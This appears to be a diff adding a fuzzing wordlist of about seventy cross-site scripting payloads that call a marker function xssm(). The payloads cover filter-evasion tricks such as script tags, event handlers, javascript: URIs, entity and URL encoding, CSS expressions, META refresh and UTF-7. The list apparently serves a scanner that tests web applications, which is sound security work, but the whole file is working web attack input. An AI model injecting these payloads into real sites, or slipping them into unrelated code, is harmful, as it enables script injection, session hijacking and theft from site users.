@@ -1,0 +1,70 @@
+<IFRAME SRC="javascript:xssm();"></IFRAME>
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:xssm();">
+<script>xssm()</script>
+<script>xssm();</script>
+"><script>xssm();</script>
+"onmouseover="xssm()"a="
+'onmouseover='xssm()'a='
+'%20onmouseover=xssm()'
+%22%20onmouseover=javascript:xssm()%20%22
+javascript:xssm()
+\');xssm();//
+);xssm();//
+');xssm();//
+%26%2339;-xssm()//
+%22);xssm();//
+%E0<body onload=xssm()>
+%00<body onload=xssm()>
+xss'%20xssm()%2F%2F
+xss%22%20xssm()%2F%2F
+%5C%5C'%2Bxssm()%3B%2F%2F
+%3Cscript%3Exssm()%3B%3C%2Fscript%3E
+xssm()%3B
+%3Cscript%3Ea%3D%2FXSS%2F
+xssm()%3C%2Fscript%3E
+%22%3E%3Cscript%3Exssm()%3B%3C%2Fscript%3E
+xss%20-%22%3E%3Cscript%3Exssm()%3C%2Fscript%3E
+xss%20%3Cscript%3Exssm()%3B%3C%2Fscript%3E
+<SCRIPT>xssm();</SCRIPT>
+<IMG SRC="javascript:xssm();">
+<IMG SRC=javascript:xssm()>
+"><IMG SRC=javascript:xssm()>
+<IMG SRC=JaVaScRiPt:xssm()>
+<IMG SRC=javascript:eval(String.fromCharCode(120,115,115,109,40,41))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#120;&#115;&#115;&#109;&#40;&#41;>
+<IMG SRC="jav	ascript:xssm();">
+<IMG SRC="jav&#x09;ascript:xssm();">
+<IMG SRC="jav&#x0A;ascript:xssm();">
+<IMG SRC="jav&#x0D;ascript:xssm();">
+<IMG SRC=" &#14;  javascript:xssm();">
+\";xssm();//
+<INPUT TYPE="IMAGE" SRC="javascript:xssm();">
+<BODY BACKGROUND="javascript:xssm()">
+<BODY ONLOAD=xssm()>
+<IMG DYNSRC="javascript:xssm()">
+<IMG LOWSRC="javascript:xssm()">
+<BGSOUND SRC="javascript:xssm();">
+vi
+<LINK REL="stylesheet" HREF="javascript:xssm();">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:xssm();">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,VHlwZSAob3IgcGFzdGUpIGhlcmUuLi4">
+<META HTTP-EQUIV="Link" Content="<javascript:xssm()>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:xssm();">
+<FRAMESET><FRAME SRC="javascript:xssm();"></FRAMESET>
+<TABLE BACKGROUND="javascript:xssm()">
+<DIV STYLE="background-image: url(javascript:xssm())">
+<DIV STYLE="background-image: url(&#1;javascript:xssm())">
+<DIV STYLE="width: expression(xssm());">
+<STYLE>@im\port'\ja\vasc\ript:xssm()';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(xssm())">
+<XSS STYLE="xss:expression(xssm())">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">xssm();</STYLE>
+<STYLE>.XSS{background-image:url("javascript:xssm()");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:xssm()")}</STYLE>
+<BASE HREF="javascript:xssm();//">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=xssm()></OBJECT>
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:xssm();">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;xssm()&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-xssm();+ADw-/SCRIPT+AD4-
+<img src=a onerror=xssm() %0A>
